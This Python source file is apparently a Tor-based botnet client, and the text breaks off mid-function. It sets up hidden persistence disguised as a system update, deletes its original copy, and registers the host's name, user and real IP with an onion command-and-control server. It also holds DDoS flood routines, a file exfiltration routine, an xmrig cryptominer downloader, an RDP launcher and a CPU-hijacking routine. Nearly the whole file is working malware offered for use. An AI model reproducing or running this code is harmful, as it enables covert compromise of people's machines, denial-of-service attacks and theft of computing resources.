import os
import sys
import socket
import subprocess
import base64
import json
import time
import random
import threading
import platform
import socks
import logging
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from scapy.all import sr, IP, ICMP, TCP, ARP, Ether
from netaddr import IPNetwork, IPAddress
import requests
import stem
import shutil
import getpass
import argparse
import zipfile, io
import urllib.request, ipaddress
import tarfile
import cv2
import psutil
from subprocess import Popen, PIPE
import csv
import stat


# Tor Expert Bundle URLs
TOR_URLS = {
    "Windows_86_64": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-windows-x86_64-14.5.6.tar.gz",
    "Windows_i686": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-windows-i686-14.5.6.tar.gz",
    "MAC-OSx_86_64": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-macos-x86_64-14.5.6.tar.gz",
    "MAC-OSx_i686": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-macos-i686-14.5.6.tar.gz",
    "Linux_86_64": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-linux-x86_64-14.5.6.tar.gz",
    "Linux_i686": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-linux-i686-14.5.6.tar.gz"
}

TOR_FOLDER = "TorExpert"
TOR_EXE_NAME = "tor.exe"        # Only for Windows
TOR_BIN_NAME = "tor"            # Linux/macOS binary name
TOR_HOST = "127.0.0.1"
TOR_PORT = 9050

DEFAULT_CONTROL_URL = "http://zidveflgk5ab3mfoqgmq35fulrmklpbbdexpfj2lscdbqmqruqjz2qyd.onion"
_control_url_lock = threading.Lock()
_current_control_url = DEFAULT_CONTROL_URL

def get_current_control_url():
    """Return the most recent control URL the bot knows about."""
    with _control_url_lock:
        return _current_control_url

def update_control_url(new_url):
    """Update the control URL if the server provides a new one."""
    if not new_url:
        return

    sanitized = new_url.strip()
    if not sanitized:
        return

    global _current_control_url
    with _control_url_lock:
        if sanitized != _current_control_url:
            logging.getLogger('ControlURL').info(f"Control URL updated to {sanitized}")
            _current_control_url = sanitized

def build_c2_url(path_fragment):
    """Build a full C2 URL for the given path fragment."""
    base = get_current_control_url().rstrip('/')
    fragment = path_fragment.lstrip('/')
    return f"{base}/{fragment}"

def debug(msg):
    print(f"[DEBUG] {msg}")

def go_to_root():
    """Change working directory to the filesystem root (OS-agnostic)."""
    root_dir = os.path.abspath(os.sep)
    try:
        os.chdir(root_dir)
        print(f"[INFO] Changed working directory to root: {root_dir}")
    except Exception as e:
        print(f"[ERROR] Could not change to root dir: {e}")
        sys.exit(1)

def download_file(url, dest):
    if os.path.exists(dest):
        debug(f"{dest} already exists, skipping download.")
        return
    debug(f"Downloading {url} to {dest}...")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req) as response, open(dest, "wb") as out_file:
            out_file.write(response.read())
        debug("Download succeeded.")
    except Exception as e:
        print(f"[!] Download failed: {e}")
        sys.exit(1)

def extract_tar_gz(tar_path, extract_to):
    debug(f"Extracting {tar_path} to {extract_to}...")
    with tarfile.open(tar_path, "r:gz") as tar:
        tar.extractall(path=extract_to)
    debug("Extraction complete.")

def find_tor_binary(base_folder, bin_name):
    for root, dirs, files in os.walk(base_folder):
        if bin_name in files:
            return os.path.join(root, bin_name)
    return None

def detect_platform_key():
    system = platform.system()
    arch = platform.machine().lower()  # normalize

    if system == "Windows":
        if arch in ("amd64", "x86_64"):
            return "Windows_86_64"
        elif arch in ("i386", "i686", "x86"):
            return "Windows_i686"
    elif system == "Darwin":
        if arch == "x86_64":
            return "MAC-OSx_86_64"
        elif arch in ("i386", "i686"):
            return "MAC-OSx_i686"
        elif arch == "arm64":
            print("[!] macOS ARM64 detected, no prebuilt Tor bundle in TOR_URLS")
            sys.exit(1)
    elif system == "Linux":
        if arch in ("x86_64", "amd64"):
            return "Linux_86_64"
        elif arch in ("i386", "i686", "x86"):
            return "Linux_i686"
        elif arch in ("arm64", "aarch64"):
            print("[!] Linux ARM64 detected, no prebuilt Tor bundle in TOR_URLS")
            sys.exit(1)
    print(f"[!] Unsupported system/arch: {system} ({arch})")
    sys.exit(1)


def prepare_tor():
    print("[DEBUG_PT] - PREPARING TOR...")

    # First, check if Tor exists in the system PATH
    system = platform.system()
    tor_in_path = None
    if system == "Windows":
        tor_in_path = shutil.which("tor.exe")
    else:
        tor_in_path = shutil.which("tor")

    if tor_in_path:
        print(f"[DEBUG_PT] - SYSTEM TOR FOUND: {tor_in_path}")
        tor_path = tor_in_path
        return tor_path  # Use system-installed Tor

    # Tor not found system-wide; proceed with local Expert Bundle setup
    os.makedirs(TOR_FOLDER, exist_ok=True)
    print(f"[DEBUG_PT] - TOR FOLDER exists: {TOR_FOLDER}")

    platform_key = detect_platform_key()  # e.g., "Linux_86_64"
    bin_name = TOR_EXE_NAME if "Windows" in platform_key else TOR_BIN_NAME
    tar_path = os.path.join(TOR_FOLDER, "tor_expert.tar.gz")
    final_bin_folder = os.path.join(TOR_FOLDER, bin_name)
    final_bin_path = os.path.join(final_bin_folder, bin_name)

    # Debug checks
    print(f"[DEBUG_PT] - TAR PATH: {tar_path}")
    print(f"[DEBUG_PT] - BIN NAME: {bin_name}")
    print(f"[DEBUG_PT] - FINAL TOR PATH: {final_bin_path}")

    # Search for existing binary inside TorExpert
    extracted_bin = find_tor_binary(TOR_FOLDER, bin_name)
    if extracted_bin:
        print(f"[DEBUG_PT] - EXISTING BINARY FOUND: {extracted_bin}")
    else:
        print("[DEBUG_PT] - NO EXISTING BINARY FOUND")
        download_file(TOR_URLS[platform_key], tar_path)
        extract_tar_gz(tar_path, TOR_FOLDER)
        extracted_bin = find_tor_binary(TOR_FOLDER, bin_name)

        if not extracted_bin or not os.path.isfile(extracted_bin):
            print(f"[!] Tor binary '{bin_name}' not found after extraction in {TOR_FOLDER}")
            sys.exit(1)
        else:
            print(f"[DEBUG_PT] - EXTRACTED BINARY FOUND: {extracted_bin}")

    # Ensure binary folder exists
    os.makedirs(final_bin_folder, exist_ok=True)

    # Move binary to final path if needed
    if extracted_bin != final_bin_path:
        try:
            shutil.move(extracted_bin, final_bin_path)
            print(f"[DEBUG_PT] - MOVED BINARY TO FINAL PATH: {final_bin_path}")
        except shutil.Error:
            print(f"[DEBUG_PT] - Binary already exists at {final_bin_path}, using existing one")

    # Set execute permission on Unix
    if "Windows" not in platform_key:
        os.chmod(final_bin_path, 0o755)
        print(f"[DEBUG_PT] - Set execute permissions on {final_bin_path}")

    # Final debug
    print(f"[DEBUG_PT] - USING TOR BINARY AT: {final_bin_path}")
    return final_bin_path




tor_path = prepare_tor()
print("Tor Path: ",tor_path)
def start_tor(tor_path):
    print("Starting Tor")

    print("USING PATH:", tor_path)
    debug("Preparing torrc...")
    torrc_path = os.path.join(TOR_FOLDER, "torrc")
    if not os.path.exists(torrc_path):
        with open(torrc_path, "w") as f:
            f.write("SocksPort 9050\nLog notice stdout\nDisableNetwork 0\nAvoidDiskWrites 1\n")

    debug("Starting Tor daemon...")
    try:
        subprocess.Popen([tor_path, "-f", torrc_path],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        debug("Waiting for Tor to listen on port 9050...")
        for i in range(120):
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                if s.connect_ex((TOR_HOST, TOR_PORT)) == 0:
                    debug(f"Tor is ready on port 9050 after {i+1} seconds.")
                    return
            time.sleep(1)
        print("[!] Tor did not start within 2 minutes.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Failed to start Tor: {e}")
        sys.exit(1)

def make_persistent():
    """
    Sets up the script to auto-run on system startup.
    On Windows, adds a batch file to the Startup folder.
    On Linux/macOS, skips for safety (can be added if desired).
    """
    system = platform.system()
    script_path = os.path.abspath(sys.argv[0])

    if system == "Windows":
        startup_path = os.path.join(
            os.getenv("APPDATA"),
            "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        )
        os.makedirs(startup_path, exist_ok=True)
        shortcut = os.path.join(startup_path, "SystemUpdate.bat")
        with open(shortcut, "w") as f:
            f.write(f'start "" python "{script_path}"\n')
        debug("Persistence set up successfully on Windows.")
    elif system == "Linux":
        autostart_dir = os.path.expanduser("~/.config/autostart")
        os.makedirs(autostart_dir, exist_ok=True)
        shortcut = os.path.join(autostart_dir, "SystemUpdate.desktop")
        with open(shortcut, "w") as f:
            f.write(f"""[Desktop Entry]
Type=Application
Exec=python3 {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=SystemUpdate
Comment=Auto-start script
""")
        debug("Persistence set up successfully on Linux.")
    elif system == "Darwin":  # macOS
        launch_agents = os.path.expanduser("~/Library/LaunchAgents")
        os.makedirs(launch_agents, exist_ok=True)
        plist_path = os.path.join(launch_agents, "com.systemupdate.plist")
        with open(plist_path, "w") as f:
            f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>com.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
      <string>python3</string>
      <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
  </dict>
</plist>""")
        debug("Persistence set up successfully on macOS.")
    else:
        debug(f"Persistence setup skipped for unsupported system: {system}")




# --- Persistence ---



logger = logging.getLogger(__name__)

# --- Windows Persistence ---
def setup_persistence_windows():
    import winreg
    logger = logging.getLogger(__name__)
    logger.info("Setting up persistence for ALL users...")

    try:
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "UPDATE"
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

        # Open HKLM with write access
        reg_key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            key,
            0,
            winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY
        )
        # Create a hidden folder and copy the script
        hidden_folder = os.path.join(os.path.dirname(exe_path), ".UPDATE")
        if not os.path.exists(hidden_folder):
            os.makedirs(hidden_folder, exist_ok=True)
        copied_exe_path = os.path.join(hidden_folder, "update.py")
        shutil.copy(exe_path, copied_exe_path)

        # Verify the copy exists
        if os.path.exists(copied_exe_path):
            logger.info(f"Copied script verified: {copied_exe_path}")
            # Delete the original script
            os.remove(exe_path)
            logger.info(f"Original script deleted: {exe_path}")
            return copied_exe_path
        else:
            logger.error(f"Copy verification failed: {copied_exe_path}")

        winreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, copied_exe_path)
        winreg.CloseKey(reg_key)

        logger.info("Persistence setup completed for ALL users.")
    except PermissionError:
        logger.error("Administrator privileges are required to set persistence for all users.")
    except Exception as e:
        logger.error(f"Unexpected error setting up persistence for all users: {e}")

# --- Linux Persistence ---
def get_user_home():
    system = platform.system()
    if system == "Windows":
        # Windows user home
        import winreg
        user = os.environ.get('USERNAME') or getpass.getuser()
        return os.path.join("C:\\Users", user)
    else:
        # Linux/macOS user home
        import pwd
        user = os.environ.get('SUDO_USER') or getpass.getuser()
        return pwd.getpwnam(user).pw_dir




def is_hidden_copy():
    script_path = os.path.abspath(__file__)
    return ".UPDATE" in script_path
    print(script_path)

def setup_persistence_linux():
    logger.info("Setting up persistence on Linux...")
    try:
        user_home = get_user_home()
        startup_dir = os.path.join(user_home, ".config", "autostart")

        if not os.path.exists(startup_dir):
            os.makedirs(startup_dir, exist_ok=True)
            os.chmod(startup_dir, 0o777)  # Ensure full access
            logger.info(f"Created startup directory: {startup_dir} with 777 permissions")

        script_path = os.path.abspath(__file__)
        desktop_entry_path = os.path.join(startup_dir, "UPDATE.desktop")
        desktop_entry = f"""[Desktop Entry]
Type=Application
Exec={os.path.join(startup_dir, ".UPDATE", "update.py")}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=UPDATE
Comment=Start UPDATE at login
"""

        if not os.path.exists(desktop_entry_path):
            with open(desktop_entry_path, 'w') as f:
                f.write(desktop_entry)
            os.chmod(desktop_entry_path, 0o777)  # Set permissions
            logger.info(f"Created persistence file: {desktop_entry_path} with 777 permissions")

        # Create a hidden folder and copy the script
        hidden_folder = os.path.join(startup_dir, ".UPDATE")
        if not os.path.exists(hidden_folder):
            os.makedirs(hidden_folder, exist_ok=True)
        copied_script_path = os.path.join(hidden_folder, "update.py")
        shutil.copy(script_path, copied_script_path)

        # Verify the copy exists
        if os.path.exists(copied_script_path):
            logger.info(f"Copied script verified: {copied_script_path}")
            # Delete the original script
            os.remove(script_path)
            logger.info(f"Original script deleted: {script_path}")
            return copied_script_path
        else:
            logger.error(f"Copy verification failed: {copied_script_path}")

        logger.info("Persistence setup completed on Linux.")
    except Exception as e:
        logger.error(f"Failed to set up persistence on Linux: {e}")


def run_file(file_path):
    """
    Runs a file, detecting type and using the proper method.
    Supports: Python scripts (.py), executables (.exe, .bin, etc.), and general binaries.
    """
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"File not found: {file_path}")

    _, ext = os.path.splitext(file_path)
    ext = ext.lower()

    if ext == ".py":
        # Run Python script with current interpreter
        subprocess.run([sys.executable, file_path])
    elif os.access(file_path, os.X_OK) or ext in {".exe", ".bin"}:
        # Executable or binary
        subprocess.run([file_path])
    else:
        # Attempt to execute anyway (Linux may allow scripts without extension)
        subprocess.run([file_path])


# --- Main Persistence Function ---
def setup_persistence():
    logger.info("Setting up persistence...")
    system = platform.system()

    file_path = None  # Initialize

    if system == "Windows":
        file_path = setup_persistence_windows()
    elif system in ("Linux", "Darwin"):  # Darwin covers macOS
        file_path = setup_persistence_linux()
    else:
        logger.warning(f"Unsupported OS for persistence: {system}")

    if file_path:
        run_file(file_path)
    else:
        logger.error("Persistence setup did not return a valid file path.")

current_path = os.path.abspath(__file__) if not getattr(sys, 'frozen', False) else sys.executable

# Directory containing the script/executable
current_dir = os.path.dirname(current_path)


logger = logging.getLogger('Bot')
if __name__ == '__main__':
    debug("Starting Tor Expert Bundle automation script...")

    logger.info(f"Bot script started")
    try:
        if not is_hidden_copy():
            # Setup persistence and run the copied file
            print("Executing First Run From Directory: ", current_dir)
            copied_path = setup_persistence()  # ensure setup_persistence() returns the copied path
            if copied_path:
                run_file(copied_path)  # execute the hidden copy
            sys.exit(0)  # Exit the original script
        else:
            # Hidden copy: normal execution
            tor_exe_path = prepare_tor()
            start_tor(tor_path)
            make_persistent()
            debug("Tor initialised and running...REROUTING...")
            # Full absolute path to the current script/executable
            # Directory containing the script/executable

            print("Executing From Directory: ", current_dir)




            # --- Detailed Logging Configuration ---

            # --- Detailed Logging Configuration ---
            logging.basicConfig(
                level=logging.DEBUG,
                format='%(asctime)s - %(name)s - %(levelname)s - %(threadName)s - %(message)s',
                datefmt='%Y-%m-%d %H:%M:%S'
            )
            logger = logging.getLogger('Bot')

            logger.info("Bot script started.")

            # --- Argument Parser ---
            parser = argparse.ArgumentParser(description='A bot that connects to a C2 server.')
            parser.add_argument('--output', default='output.txt', help='The name of the output file.')
            args = parser.parse_args()
            logger.debug(f"Arguments parsed: {args}")

            # --- Configuration ---
            def get_c2_address():
                logger.info("Attempting to determine C2 address...")
                address = get_current_control_url()
                if address:
                    logger.info(f"Using C2 address: {address}")
                    return address

                logger.warning("No control URL provided; falling back to default.")
                return DEFAULT_CONTROL_URL

            C2_SERVER = get_c2_address()
            BOT_ID = f"{platform.node()}-{os.getpid()}"
            ENCRYPTION_KEY = b'sixteen byte key'
            MODULES_DIR = 'MODULES'
            logger.debug(f"Bot ID set to: {BOT_ID}")
            logger.debug("Core configuration variables set.")

            # --- Tor Proxy Configuration ---
            proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
            logger.debug(f"Tor proxy configured: {proxies}")




            # --- C2 Logging Handler ---
            class C2LogHandler(logging.Handler):
                def __init__(self, bot_id, proxies):
                    super().__init__()
                    self.bot_id = bot_id
                    self.proxies = proxies

                def emit(self, record):
                    log_entry = self.format(record)
                    try:
                        endpoint = build_c2_url(f"/api/bot/log/{self.bot_id}")
                        # Run in a separate thread to avoid blocking
                        log_thread = threading.Thread(
                            target=requests.post,
                            args=(endpoint,),
                            kwargs={'data': log_entry, 'proxies': self.proxies, 'timeout': 10}
                        )
                        log_thread.daemon = True
                        log_thread.start()
                    except Exception:
                        # Can't log this error to C2, so just ignore it
                        pass

            def send_network_stats():
                while True:
                    try:
                        net_io = psutil.net_io_counters()
                        stats = {
                            'bytes_sent': net_io.bytes_sent,
                            'bytes_recv': net_io.bytes_recv
                        }
                        endpoint = build_c2_url(f"api/bot/net_stats/{BOT_ID}")
                        response = requests.post(endpoint, json=stats, proxies=proxies, timeout=10)
                        try:
                            response_data = response.json()
                        except (json.JSONDecodeError, ValueError):
                            response_data = {}
                        update_control_url(response_data.get('control_url'))
                    except Exception as e:
                        logger.warning(f"Could not send network stats: {e}")
                    time.sleep(10)
            # --- Tor Connectivity Check ---
            def check_tor_connectivity():
                logger.info("Verifying Tor connectivity...")
                try:
                    logger.debug("Making request to https://check.torproject.org/api/ip via Tor proxy.")
                    response = requests.get("https://check.torproject.org/api/ip", proxies=proxies, timeout=120)
                    response.raise_for_status()
                    data = response.json()
                    logger.debug(f"Tor check response: {data}")
                    if data.get('IsTor'):
                        logger.info(f"Tor connectivity confirmed. External IP: {data.get('IP')}")
                        return True
                    else:
                        logger.warning(f"Connected, but not through Tor. IP: {data.get('IP')}")
                        return False
                except requests.exceptions.RequestException:
                    logger.exception("Tor connectivity check failed. Is the Tor service running on port 9050?")
                    return False
                except json.JSONDecodeError:
                    logger.exception("Failed to decode JSON response from Tor check.")
                    return False
                except Exception:
                    logger.exception("An unexpected error occurred during Tor connectivity check.")
                    return False



            # --- Ping Function ---
            def ping_c2():
                C2_SERVER = get_c2_address()  # Make sure this function exists


                # Check if registration file exists
                if os.path.exists('reg.csv'):
                    try:
                        with open('reg.csv', 'r') as f:
                            reader = csv.reader(f)
                            next(reader)  # skip header
                            reg_data = next(reader)
                            BOT_ID = reg_data[0]
                    except Exception:
                        logger.warning("Failed to read bot registration. Will attempt fresh registration.")




            def encrypt_data(data):
                logger.debug(f"Encrypting data of length {len(data)} bytes.")
                try:
                    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC)
                    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
                    iv = base64.b64encode(cipher.iv).decode('utf-8')
                    ct = base64.b64encode(ct_bytes).decode('utf-8')
                    encrypted_string = iv + ct
                    logger.debug(f"Encryption successful. Result length: {len(encrypted_string)}")
                    return encrypted_string
                except Exception:
                    logger.exception("An unexpected error occurred during data encryption.")
                    raise


            def decrypt_data(encrypted_data):
                logger.debug(f"Decrypting data of length {len(encrypted_data)} bytes.")
                try:
                    iv = base64.b64decode(encrypted_data[:24])
                    ct = base64.b64decode(encrypted_data[24:])
                    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
                    pt = unpad(cipher.decrypt(ct), AES.block_size)
                    decrypted_string = pt.decode()
                    logger.debug(f"Decryption successful. Result length: {len(decrypted_string)}")
                    return decrypted_string
                except Exception:
                    logger.exception("An unexpected error occurred during data decryption.")
                    raise




            UA = "Mozilla/5.0"

            PROVIDERS_V4 = [
                "https://api.ipify.org",
                "https://checkip.amazonaws.com",
                "https://ipv4.icanhazip.com",
                "https://ifconfig.me/ip",
                "https://ident.me",
            ]

            PROVIDERS_V6 = [
                "https://api6.ipify.org",
                "https://ipv6.icanhazip.com",
            ]

            def _fetch(url: str, timeout: float) -> str | None:
                req = urllib.request.Request(url, headers={"User-Agent": UA})
                with urllib.request.urlopen(req, timeout=timeout) as r:
                    raw = r.read().decode().strip()
                try:
                    ip = ipaddress.ip_address(raw)
                    return str(ip)
                except ValueError:
                    return None

            def public_ip(prefer_ipv6: bool = False, timeout: float = 4.0) -> str:
                providers = (PROVIDERS_V6 + PROVIDERS_V4) if prefer_ipv6 else (PROVIDERS_V4 + PROVIDERS_V6)
                providers = providers[:]  # copy
                random.shuffle(providers)

                last_err = None
                for url in providers:
                    try:
                        # We don't use the proxy here to get the REAL public IP
                        ip = _fetch(url, timeout)
                        if ip:
                            if prefer_ipv6 and ":" in ip:
                                return ip
                            if not prefer_ipv6 and ":" not in ip:
                                return ip
                            # if preference not met, still accept a valid IP after trying a few
                            fallback = _fetch(url, timeout)
                            if fallback:
                                return fallback
                    except Exception as e:
                        last_err = e
                        continue
                raise RuntimeError(f"could not determine public IP; last error: {last_err}")




            # Assuming encrypt_data and public_ip are defined elsewhere in your code
            # from your_module import encrypt_data, public_ip

            logger = logging.getLogger(__name__)

            def generate_bot_id():
                """Generate a bot ID using the hostname as prefix and current process PID as suffix."""
                hostname = platform.node().upper()  # Standardize hostname to uppercase
                pid = os.getpid()  # Get current process ID
                return f"{hostname}-{pid}"

            def register_with_c2():
                proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}

                # Attempt to read existing registration
                if os.path.exists('reg.csv'):
                    try:
                        with open('reg.csv', 'r') as f:
                            reader = csv.reader(f)
                            header = next(reader, None)  # skip header safely
                            row = next(reader, None)  # get first data row
                            if row and row[0]:
                                bot_id = row[0]

                                BOT_ID = bot_id
                                logger.warning(f"Existing BOT_ID found: {BOT_ID}")

                                # Send ping to C2
                                ping_payload = {'id': BOT_ID}
                                encrypted_payload = encrypt_data(json.dumps(ping_payload))
                                ping_url = build_c2_url('/api/bot/ping')
                                logger.warning(f"Sending Ping To: {ping_url}")
                                response = requests.post(ping_url, data=encrypted_payload, proxies=proxies, timeout=60)

                                # Check for pong
                                try:
                                    logger.debug(f"Ping response status code: {response.status_code}")
                                    logger.debug(f"Ping response text: {response.text}")
                                    if response.status_code == 200:
                                        output = response.json()
                                        update_control_url(output.get('control_url'))
                                        logger.debug(f"Ping Output text: {output}")
                                        if output.get('status') == 'green' or output.get('output') == 'pong':
                                            logger.info(f"{BOT_ID} received pong from C2")
                                            return BOT_ID
                                            bot_id = BOT_ID
                                            return bot_id
                                        else:
                                            logger.warning(f"Unexpected ping response: {output}")
                                    elif response.status_code == 405:
                                        logger.warning(f"Ping request returned 405 Method Not Allowed. Response: {response.text}")
                                    else:
                                        logger.warning(f"Ping request returned an unexpected status code: {response.status_code}")
                                except json.JSONDecodeError:
                                    logger.warning("Failed to parse ping response as JSON.")
                                except Exception as e:
                                    logger.warning(f"An error occurred while parsing the ping response: {e}")

                    except Exception as e:
                        logger.warning(f"Failed to read existing BOT_ID. Will attempt fresh registration. Error: {e}")

                N_BOT_ID = generate_bot_id()
                logger.debug(f"Bot ID set to: {N_BOT_ID}")
                logger.debug("Core configuration variables set.")

                # Attempt full registration
                logger.info(f"Attempting to register bot with ID: {N_BOT_ID}")
                try:
                    info = {
                        'os': platform.system(),
                        'hostname': platform.node(),
                        'user': getpass.getuser(),
                        'ip': public_ip()
                    }
                    payload = {'id': N_BOT_ID, 'info': info}
                    logger.debug(f"Registration payload (pre-encryption): {json.dumps(payload)}")

                    encrypted_payload = encrypt_data(json.dumps(payload))
                    registration_url = build_c2_url('/api/bot/register')

                    logger.debug(f"Sending registration request to: {registration_url}")
                    response = requests.post(registration_url, data=encrypted_payload, proxies=proxies, timeout=120)
                    response.raise_for_status()
                    try:
                        response_data = response.json()
                    except json.JSONDecodeError:
                        response_data = {}
                    update_control_url(response_data.get('control_url'))

                    logger.info("Successfully registered with C2 server.")

                    csv_path = "reg.csv"
                    header = ["BOT_ID"]

                    # Check if file exists
                    file_exists = os.path.exists(csv_path)

                    with open(csv_path, 'a', newline='') as f:  # append mode
                        writer = csv.writer(f)
                        if not file_exists:
                            writer.writerow(header)  # write header only if file is new
                        writer.writerow([N_BOT_ID])  # write the BOT_ID

                except requests.exceptions.RequestException as e:
                    logger.exception(f"Failed to register with C2 due to a network error. Will retry later. Error: {e}")
                    time.sleep(10)
                except Exception as e:
                    logger.exception(f"An unexpected error occurred during registration. Error: {e}")
                    time.sleep(10)

                return N_BOT_ID
                bot_id = N_BOT_ID
                return bot_id



    # Handle other commands as needed
            # --- Bot Function Definitions ---
            def ddos(target, port, method, duration, pps):
                if method == 'syn-flood':
                    syn_flood(target, port, duration, pps)
                elif method == 'udp-flood':
                    udp_flood(target, port, duration, pps)
                elif method == 'http-flood':
                    http_flood(target, port, duration, pps)
                else:
                    logger.error(f"Unknown DDoS method: {method}")

            def syn_flood(target, port, duration, pps):
                start_time = time.time()
                while time.time() - start_time < duration:
                    try:
                        for _ in range(pps):
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.connect((target, port))
                            sock.sendall(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
                            sock.close()
                        time.sleep(1)
                    except Exception as e:
                        logger.error(f"Error in SYN flood: {e}")

            def udp_flood(target, port, duration, pps):
                start_time = time.time()
                while time.time() - start_time < duration:
                    try:
                        for _ in range(pps):
                            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            sock.sendto(b' ' * 1024, (target, port))
                        time.sleep(1)
                    except Exception as e:
                        logger.error(f"Error in UDP flood: {e}")

            def http_flood(target, port, duration, pps):
                start_time = time.time()
                while time.time() - start_time < duration:
                    try:
                        for _ in range(pps):
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.connect((target, port))
                            sock.sendall(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
                            sock.close()
                        time.sleep(1)
                    except Exception as e:
                        logger.error(f"Error in HTTP flood: {e}")

            def dataExfiltration(file_path, method, search_pattern):
                logger.info(f"Exfiltrating data from {file_path} using {method}.")
                try:
                    with open(file_path, 'r') as file:
                        content = file.read()
                        if search_pattern:
                            matches = [line for line in content.split('\n') if search_pattern in line]
                            return matches
                        else:
                            return content
                except Exception as e:
                    logger.error(f"Error exfiltrating data: {e}")
                    return None

            def geolocation(ip_address):
                logger.info(f"Getting geolocation for IP: {ip_address}")
                try:
                    response = requests.get(f'https://ipinfo.io/{ip_address}/json')
                    response.raise_for_status()
                    data = response.json()
                    return data
                except requests.exceptions.RequestException as e:
                    logger.error(f"Error getting geolocation: {e}")
                    return None



            # Configure logging
            logger = logging.getLogger(__name__)

            MINER_BINARIES = {
                'windows': {
                    'btc': 'https://download.ccextract.com/bitcoin-core-25.0-win64.zip',
                    'xmr': 'https://download.xmrig.com/v6.24.0/xmrig-6.24.0-win64.zip'
                },
                'linux': {
                    'btc': 'https://download.ccextract.com/bitcoin-core-25.0-x86_64-linux-gnu.tar.gz',
                    'xmr': 'https://download.xmrig.com/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz'
                },
                'darwin': {
                    'btc': 'https://download.ccextract.com/bitcoin-core-25.0-osx64.tar.gz',
                    'xmr': 'https://download.xmrig.com/v6.24.0/xmrig-6.24.0-macos-static-x64.tar.gz'
                }
            }

            def miner(start, stop, recipient_address, resource_use_cap, pool, proxies, token_name):
                logger.info(f"Starting miner for {token_name}.")
                try:
                    os_name = platform.system().lower()
                    if os_name not in MINER_BINARIES:
                        logger.error(f"Unsupported OS: {os_name}")
                        return f"Unsupported OS: {os_name}"

                    miner_url = MINER_BINARIES[os_name][token_name.lower()]
                    miner_exe = download_and_extract_miner(miner_url, token_name)

                    if stop:
                        logger.info(f"Stopping {token_name} miner.")
                        stop_miner(miner_exe, token_name)
                    else:
                        start_miner(miner_exe, recipient_address, resource_use_cap, pool, proxies, token_name)
                        logger.info(f"{token_name} miner started.")
                    return f"{token_name} miner operations finished."
                except Exception as e:
                    logger.error(f"Error in miner: {e}")
                    return None

            def download_and_extract_miner(url, token_name):
                response = requests.get(url)
                response.raise_for_status()
                extract_path = f'./miners/{token_name}'
                os.makedirs(extract_path, exist_ok=True)

                if token_name.lower() == 'btc':
                    with zipfile.ZipFile(io.BytesIO(response.content)) as z:
                        z.extractall(path=extract_path)
                    miner_exe = f'{extract_path}/bitcoin-qt'
                elif token_name.lower() == 'xmr':
                    with tarfile.open(fileobj=io.BytesIO(response.content), mode="r:gz") as tar:
                        tar.extractall(path=extract_path)
                    miner_exe = f'{extract_path}/xmrig'
                else:
                    logger.error(f"Unknown token: {token_name}")
                    return None

                os.chmod(miner_exe, 0o755)  # Make the executable readable and executable
                return miner_exe

            def start_miner(miner_exe, recipient_address, resource_use_cap, pool, proxies, token_name):
                command = [
                    miner_exe,
                    '--url', pool,
                    '--user', recipient_address,
                    '--pass', 'x',
                    '--proxy', proxies,
                    '--max-cpu-usage', str(resource_use_cap)
                ]
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                logger.info(f"Started {token_name} miner with PID {process.pid}.")

            def stop_miner(miner_exe, token_name):
                command = ['pkill', '-f', miner_exe]
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                logger.info(f"Stopped {token_name} miner with command {command}.")

            def rdp(target, username, password):
                logger.info(f"Attempting RDP to {target} with username {username}.")
                try:
                    command = f'xfreerdp /v:{target} /u:{username} /p:{password} /cert:tofu'
                    subprocess.run(command, shell=True, check=True)
                    return f"RDP connection to {target} successful."
                except subprocess.CalledProcessError as e:
                    logger.error(f"RDP connection failed: {e}")
                    return None




            # Configure logging
            logger = logging.getLogger(__name__)

            def resourceHijack(process_name, cpu_usage, duration, display_all_procs=False):
                logger.info(f"Hijacking resources for process {process_name}.")
                try:
                    start_time = time.time()
                    while time.time() - start_time < duration:
                        # Simulate CPU usage
                        for _ in range(cpu_usage):
                            _ = [i * i for i in range(1000000)]
                        time.sleep(1)

                    if display_all_procs:
                        logger.info("Displaying all running processes:")
                        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
